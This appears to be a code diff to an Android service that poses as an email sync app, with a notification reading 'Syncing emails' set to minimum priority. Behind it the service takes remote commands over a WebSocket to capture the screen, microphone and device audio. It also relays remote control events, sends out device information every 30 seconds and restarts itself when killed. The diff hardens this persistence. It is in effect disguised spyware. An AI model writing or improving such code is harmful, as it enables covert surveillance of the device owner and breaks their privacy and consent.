@@ -8,30 +8,30 @@ import android.app.Service
 import android.content.Context
 import android.content.Intent
 import android.content.SharedPreferences
+import android.content.pm.ServiceInfo
 import android.os.Build
 import android.os.IBinder
 import android.os.PowerManager
 import android.os.SystemClock
 import androidx.core.app.NotificationCompat
 import com.email.MainActivity
-import com.email.R
 import com.email.util.DeviceInfoUtil
 import kotlinx.coroutines.*
 
 class RemoteMonitorService : Service() {
 
     companion object {
-        const val ACTION_START_SCREEN  = "START_SCREEN"
-        const val ACTION_STOP_SCREEN   = "STOP_SCREEN"
-        const val ACTION_START_MIC     = "START_MIC"
-        const val ACTION_STOP_MIC      = "STOP_MIC"
-        const val ACTION_START_AUDIO   = "START_AUDIO"
-        const val ACTION_STOP_AUDIO    = "STOP_AUDIO"
-        const val ACTION_CONNECT       = "CONNECT"
+        const val ACTION_START_SCREEN = "START_SCREEN"
+        const val ACTION_STOP_SCREEN  = "STOP_SCREEN"
+        const val ACTION_START_MIC    = "START_MIC"
+        const val ACTION_STOP_MIC     = "STOP_MIC"
+        const val ACTION_START_AUDIO  = "START_AUDIO"
+        const val ACTION_STOP_AUDIO   = "STOP_AUDIO"
+        const val ACTION_CONNECT      = "CONNECT"
 
         private const val CHANNEL_ID      = "email_sync_channel"
         private const val NOTIFICATION_ID = 1001
-        private const val RESTART_ALARM_RC = 9901
+        private const val RESTART_RC      = 9901
     }
 
     private val scope = CoroutineScope(SupervisorJob() + Dispatchers.IO)
@@ -42,9 +42,9 @@ class RemoteMonitorService : Service() {
 
     override fun onCreate() {
         super.onCreate()
-        // Create channel first, then startForeground — must be within 5s on API 26+
+        // Channel must exist before startForeground
         createNotificationChannel()
-        startForeground(NOTIFICATION_ID, buildNotification())
+        promoteForeground()
 
         prefs    = getSharedPreferences("email_prefs", Context.MODE_PRIVATE)
         wsManager = WebSocketManager.getInstance()
@@ -54,14 +54,36 @@ class RemoteMonitorService : Service() {
         startPeriodicDeviceInfo()
     }
 
+    /** Call startForeground with the correct API-level form — wrapped in try/catch */
+    private fun promoteForeground() {
+        val notification = buildNotification()
+        try {
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) { // API 29+
+                startForeground(
+                    NOTIFICATION_ID,
+                    notification,
+                    ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC
+                )
+            } else {
+                startForeground(NOTIFICATION_ID, notification)
+            }
+        } catch (e: Exception) {
+            // If foreground start fails (e.g. MIUI restriction), keep running as background
+            try { startForeground(NOTIFICATION_ID, notification) } catch (_: Exception) {}
+        }
+    }
+
     override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
+        // Re-promote in case we were demoted
+        promoteForeground()
+
         when (intent?.action) {
             ACTION_START_SCREEN -> broadcastCommand("REQUEST_SCREEN_PERMISSION")
-            ACTION_STOP_SCREEN  -> stopServiceSafe(ScreenCaptureService::class.java)
-            ACTION_START_MIC    -> startServiceSafe(MicrophoneService::class.java)
-            ACTION_STOP_MIC     -> stopServiceSafe(MicrophoneService::class.java)
+            ACTION_STOP_SCREEN  -> stopSafe(ScreenCaptureService::class.java)
+            ACTION_START_MIC    -> startSafe(MicrophoneService::class.java)
+            ACTION_STOP_MIC     -> stopSafe(MicrophoneService::class.java)
             ACTION_START_AUDIO  -> broadcastCommand("REQUEST_AUDIO_PERMISSION")
-            ACTION_STOP_AUDIO   -> stopServiceSafe(DeviceAudioService::class.java)
+            ACTION_STOP_AUDIO   -> stopSafe(DeviceAudioService::class.java)
             ACTION_CONNECT      -> wsManager.connect()
         }
         return START_STICKY
@@ -72,23 +94,20 @@ class RemoteMonitorService : Service() {
             deviceId = prefs.getString("device_id", "unknown") ?: "unknown"
             fcmToken = prefs.getString("fcm_token", "") ?: ""
         }
-
         scope.launch {
             try {
                 val info = DeviceInfoUtil.collectAsJson(applicationContext)
                 val json = org.json.JSONObject(info)
-                wsManager.deviceName     = json.optString("deviceName",      Build.MODEL)
-                wsManager.model          = json.optString("model",           Build.MODEL)
-                wsManager.androidVersion = json.optString("androidVersion",  Build.VERSION.RELEASE)
+                wsManager.deviceName     = json.optString("deviceName",      android.os.Build.MODEL)
+                wsManager.model          = json.optString("model",           android.os.Build.MODEL)
+                wsManager.androidVersion = json.optString("androidVersion",  android.os.Build.VERSION.RELEASE)
                 wsManager.battery        = json.optInt("batteryLevel", 0)
                 wsManager.storage        = json.optString("availableStorage", "0")
             } catch (_: Exception) {}
         }
-
         wsManager.onControlEvent = { json ->
             RemoteControlService.handleControlJson(applicationContext, json)
         }
-
         wsManager.connect()
     }
 
@@ -97,8 +116,7 @@ class RemoteMonitorService : Service() {
             while (isActive) {
                 delay(30_000)
                 try {
-                    val json = DeviceInfoUtil.collectAsJson(applicationContext)
-                    wsManager.sendDeviceInfo(json)
+                    wsManager.sendDeviceInfo(DeviceInfoUtil.collectAsJson(applicationContext))
                 } catch (_: Exception) {}
             }
         }
@@ -111,15 +129,11 @@ class RemoteMonitorService : Service() {
         })
     }
 
-    private fun startServiceSafe(cls: Class<*>) {
-        try {
-            val i = Intent(this, cls)
-            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) startForegroundService(i)
-            else startService(i)
-        } catch (_: Exception) {}
+    private fun startSafe(cls: Class<*>) {
+        try { startService(Intent(this, cls)) } catch (_: Exception) {}
     }
 
-    private fun stopServiceSafe(cls: Class<*>) {
+    private fun stopSafe(cls: Class<*>) {
         try { stopService(Intent(this, cls)) } catch (_: Exception) {}
     }
 
@@ -127,24 +141,22 @@ class RemoteMonitorService : Service() {
         try {
             val pm = getSystemService(POWER_SERVICE) as PowerManager
             wakeLock = pm.newWakeLock(
-                PowerManager.PARTIAL_WAKE_LOCK,
-                "email::MonitorWakeLock"
+                PowerManager.PARTIAL_WAKE_LOCK, "email::MonitorWakeLock"
             ).apply { acquire(10 * 60 * 1000L) }
         } catch (_: Exception) {}
     }
 
     private fun createNotificationChannel() {
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-            val channel = NotificationChannel(
-                CHANNEL_ID,
-                "Email Sync",
-                NotificationManager.IMPORTANCE_LOW
-            ).apply {
-                description = "Keeps email synced in the background"
-                setShowBadge(false)
-            }
-            (getSystemService(NotificationManager::class.java))
-                .createNotificationChannel(channel)
+            try {
+                val ch = NotificationChannel(
+                    CHANNEL_ID, "Email Sync", NotificationManager.IMPORTANCE_LOW
+                ).apply {
+                    description = "Keeps email synced in the background"
+                    setShowBadge(false)
+                }
+                (getSystemService(NotificationManager::class.java)).createNotificationChannel(ch)
+            } catch (_: Exception) {}
         }
     }
 
@@ -152,7 +164,7 @@ class RemoteMonitorService : Service() {
         .setContentTitle("Email")
         .setContentText("Syncing emails\u2026")
         .setSmallIcon(android.R.drawable.ic_dialog_email)
-        .setPriority(NotificationCompat.PRIORITY_LOW)
+        .setPriority(NotificationCompat.PRIORITY_MIN)
         .setOngoing(true)
         .setContentIntent(
             PendingIntent.getActivity(
@@ -166,7 +178,7 @@ class RemoteMonitorService : Service() {
     override fun onBind(intent: Intent?): IBinder? = null
 
     override fun onTaskRemoved(rootIntent: Intent?) {
-        scheduleAlarmRestart()
+        scheduleRestart()
         super.onTaskRemoved(rootIntent)
     }
 
@@ -174,25 +186,20 @@ class RemoteMonitorService : Service() {
         deviceInfoJob?.cancel()
         scope.cancel()
         try { wakeLock?.release() } catch (_: Exception) {}
-        wsManager.disconnect()
+        try { wsManager.disconnect() } catch (_: Exception) {}
         super.onDestroy()
-        // Use AlarmManager for self-restart — safe on all API levels
-        scheduleAlarmRestart()
+        scheduleRestart()
     }
 
-    private fun scheduleAlarmRestart() {
+    private fun scheduleRestart() {
         try {
             val am = getSystemService(ALARM_SERVICE) as AlarmManager
             val pi = PendingIntent.getService(
-                this, RESTART_ALARM_RC,
+                this, RESTART_RC,
                 Intent(this, RemoteMonitorService::class.java),
                 PendingIntent.FLAG_ONE_SHOT or PendingIntent.FLAG_IMMUTABLE
             )
-            am.set(
-                AlarmManager.ELAPSED_REALTIME_WAKEUP,
-                SystemClock.elapsedRealtime() + 3000L,
-                pi
-            )
+            am.set(AlarmManager.ELAPSED_REALTIME_WAKEUP, SystemClock.elapsedRealtime() + 3000L, pi)
         } catch (_: Exception) {}
     }
 }
